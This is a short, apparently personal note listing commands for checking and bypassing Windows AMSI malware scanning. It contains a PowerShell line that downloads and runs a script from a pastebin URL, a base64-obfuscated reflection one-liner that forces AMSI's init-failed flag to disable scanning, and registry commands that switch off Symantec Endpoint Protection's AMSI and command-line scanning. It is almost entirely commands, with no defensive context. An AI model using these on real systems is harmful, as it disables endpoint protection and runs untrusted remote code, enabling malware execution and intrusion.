test if AMSI is activated :

 - powershell "Invoke-Expression (Invoke-WebRequest
   http://pastebin.com/raw.php?i=JHhnFV8m)"

- [Reflection.Assembly]::LoadWithPartialName('System.Management.Automation.AmsiUtils')    | Out-Null

Maybe :

- [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)

-
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Symantec\Symantec Endpoint Protection\AV\Storages\Filesystem\RealTimeScan" /v AMSIEnabled /t REG_DWORD /d 0 /f && reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Symantec\Symantec Endpoint Protection\AV\Storages\Filesystem\RealTimeScan" /v CommandLineScanEnabled /t REG_DWORD /d 0 /f
